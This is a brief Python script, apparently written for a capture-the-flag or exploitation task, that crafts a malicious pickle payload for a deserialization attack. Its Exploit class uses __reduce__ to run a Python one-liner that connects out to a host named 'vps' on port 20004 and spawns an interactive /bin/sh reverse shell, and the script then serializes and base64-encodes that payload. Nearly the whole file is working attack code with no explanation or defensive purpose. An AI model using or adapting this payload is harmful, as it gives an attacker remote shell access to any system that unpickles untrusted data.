import base64, string, pickle, codecs, platform, subprocess
class Exploit(object):
    def __reduce__(self):
        return (platform.popen,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vps\",20004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))

class RunBinSh(object):
  def __reduce__(self):
    #return (subprocess.Popen, (('/bin/sh',),))
    return (subprocess.Popen('ls', shell=True, executable='/bin/bash'))


#expl = pickle.dumps(RunBinSh())
expl = b'a'

def serialize_exploit():
    shellcode = pickle.dumps(Exploit())
    return shellcode
print(serialize_exploit())
exp = codecs.encode(serialize_exploit(),"base64")
exp = codecs.encode(expl,"base64")
#print(exp)
to_dec = exp
#print(pickle.loads(codecs.decode(str(to_dec).encode(),"base64")))

